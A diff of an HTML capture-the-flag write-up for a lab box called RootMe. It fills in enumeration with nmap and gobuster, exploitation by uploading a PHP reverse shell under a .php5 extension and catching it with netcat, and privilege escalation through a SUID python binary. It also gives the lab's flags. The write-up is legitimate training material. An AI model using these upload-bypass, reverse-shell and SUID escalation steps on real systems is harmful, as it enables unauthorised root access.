@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Rootme | Writeup</title>
+  <title>RootMe - Writeup</title>
   <link href="https://cdn.jsdelivr.net/npm/hack-font@3/build/web/hack.css" rel="stylesheet">
   <style>
     body {
@@ -10,7 +10,7 @@
       color: #c9d1d9;
       font-family: 'Hack', monospace;
       padding: 40px;
-      max-width: 800px;
+      max-width: 900px;
       margin: auto;
     }
     h1 {
@@ -41,17 +41,37 @@
   </style>
 </head>
 <body>
-  <h1>Rootme</h1>
-  <p>Status: <strong>In progress...</strong></p>
+  <h1>RootMe</h1>
+  <p>Status: <strong>Completed</strong></p>
 
   <h2>Enumeration</h2>
-  <p>In progress...</p>
+  <p><code>nmap -sC -sV -sS -p- -O [Target_IP]</code> reveals:</p>
+  <ul>
+    <li><code>22/tcp</code> → SSH (OpenSSH 7.6p1)</li>
+    <li><code>80/tcp</code> → Apache HTTPD 2.4.29</li>
+  </ul>
+  <p>Visited <code>http://[Target_IP]</code> and ran <code>gobuster</code>:</p>
+  <p><code>gobuster dir -u http://[Target_IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
+  <p>Found hidden directory: <code>/panel/</code></p>
 
   <h2>Exploitation</h2>
-  <p>In progress...</p>
+  <p>Uploaded PHP reverse shell via <code>/panel/</code></p>
+  <p>Used reverse shell from: <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey</a></p>
+  <p>Saved file as <code>revshell.php5</code> and uploaded</p>
+  <p>Visited <code>/uploads/</code> and clicked shell</p>
+  <p>Started listener: <code>nc -nlvp 4444</code></p>
+  <p>Got shell as www-data</p>
+  <p>Spawned TTY with Python:</p>
+  <code>python -c 'import pty;pty.spawn("/bin/bash")'</code>
+  <p>Found user flag: <code>THM{y0u_g0t_a_sh3ll}</code></p>
 
   <h2>Privilege Escalation</h2>
-  <p>In progress...</p>
+  <p>Enumerated SUID binaries:</p>
+  <code>find / -perm -u=s -type f 2>/dev/null</code>
+  <p>Found unusual binary: <code>/usr/bin/python</code></p>
+  <p>Escalated to root with:</p>
+  <code>/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</code>
+  <p>Accessed root flag: <code>THM{pr1v1l3g3_3sc4l4t10n}</code></p>
 
   <p><a href="../index.html">← Back to Writeups</a></p>
 </body>
